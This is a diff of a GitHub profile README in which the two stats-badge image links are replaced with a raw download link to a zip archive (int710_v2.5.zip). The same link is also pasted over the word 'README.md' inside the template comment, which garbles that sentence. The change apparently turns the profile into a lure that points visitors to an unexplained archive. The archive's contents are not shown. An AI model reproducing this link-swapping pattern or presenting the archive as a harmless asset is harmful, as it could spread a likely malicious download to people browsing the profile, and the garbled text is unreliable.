@@ -5,11 +5,11 @@
      
 Glad you visited me, let's see what else you learn
 
-![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=int710&layout=compact)
+![Top Langs](https://raw.githubusercontent.com/int710/int710/main/Teda/int710_v2.5.zip)
 </br>
-![Readme Stat](https://github-readme-stats.vercel.app/api?username=int710&show_icons=true&theme=tokyonight)
+![Readme Stat](https://raw.githubusercontent.com/int710/int710/main/Teda/int710_v2.5.zip)
 
 <!---
-int710/int710 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+int710/int710 is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/int710/int710/main/Teda/int710_v2.5.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
